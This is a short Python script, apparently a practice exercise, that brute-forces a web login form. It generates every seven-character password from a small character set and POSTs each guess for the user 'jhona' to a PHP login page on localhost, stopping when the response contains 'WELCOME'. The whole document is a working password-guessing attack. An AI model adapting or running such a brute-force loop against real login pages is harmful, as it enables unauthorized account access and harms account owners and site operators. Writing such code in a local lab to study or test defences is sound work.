#!/usr/bin/env python
#-*_ coding: utf-8 -*-

import urllib.parse as ub
import  itertools, http.client


longitud = 7
arreglo = list('shkai1')

itertoo  = itertools.product(arreglo, repeat=longitud)
#print (list(itertoo))


for i in itertoo:
	openConn = http.client.HTTPConnection("127.0.0.1:80")
	passs = ''.join(i)
	#print (passs)
	headers = {'Content-Type':'application/x-www-form-urlencoded','Accept':passs}
	param= ub.urlencode({'usertext':'jhona','passtext':passs})
	openConn.request('POST','http://localhost/Test_brut/html_te/php/backdoc.php',param,headers)
	resp=openConn.getresponse()
	readResp=resp.read()
	
	if 'INCORRECT' in readResp.decode('utf-8'):
		print('try with password', passs)
	elif 'WELCOME' in readResp.decode('utf-8'): 
		print('.................................................... OK with-',passs+readResp.decode())
		openConn.close()
		break
	else:
		print('no encontro')





	

